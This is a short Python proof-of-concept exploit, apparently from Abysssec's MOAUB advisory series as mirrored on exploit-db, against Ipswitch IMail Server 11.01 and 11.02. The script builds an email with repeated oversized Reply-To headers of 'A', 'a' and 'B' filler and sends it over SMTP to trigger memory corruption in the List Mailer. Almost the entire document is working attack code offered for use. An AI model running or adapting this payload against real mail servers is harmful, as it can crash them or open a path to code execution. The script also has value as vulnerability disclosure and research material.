'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

http://www.exploit-db.com/moaub-15-ipswitch-imail-server-list-mailer-reply-to-address-memory-corruption/

'''

'''
  Title               :  Ipswitch Imail Server List Mailer Reply-To Address memory corruption
  Version             :  Imail server v11.01 and 11.02
  Analysis            :  http://www.abysssec.com
  Vendor              :  http://www.ipswitch.com
  Impact              :  Critical
  Contact             :  shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter             :  @abysssec

'''

import smtplib

sender = 'from@fromdomain.com'
receivers = ['CrashList@wapteam-f556693']

message = """From: From Person <from@fromdomain.com>
To: To Person <CrashList@wapteam-f556693>
"""
#ReplayCount = 5
#while ReplayCount>0:
#   message = message + "Reply-To:"
counter = 3
while counter>0:
#   if counter != 50000 :
#      message = message + ","
   #message = message + "Reply-To: <someone"+str(counter)+"@example.org>"
   message = message + "Reply-To: "+("A"*200)+"a"*4+"B"*196+"@exam.com"
   counter = counter - 1
   message = message + "\n"
#   ReplayCount = ReplayCount - 1
   
#message = message + "\n"
message = message + """
Subject: SMTP e-mail test

This is a test e-mail message.

"""
#print message  
#fp = open("C:\\Program Files\\Ipswitch\\IMail\\spool\\tmp188.tmp","w")
#fp.write(message)
#fp.close()
#print "wrote"
try:
   smtpObj = smtplib.SMTP('localhost')
   smtpObj.sendmail(sender, receivers, message)         
   print "Successfully sent email"
except SMTPException:
   print "Error: unable to send email"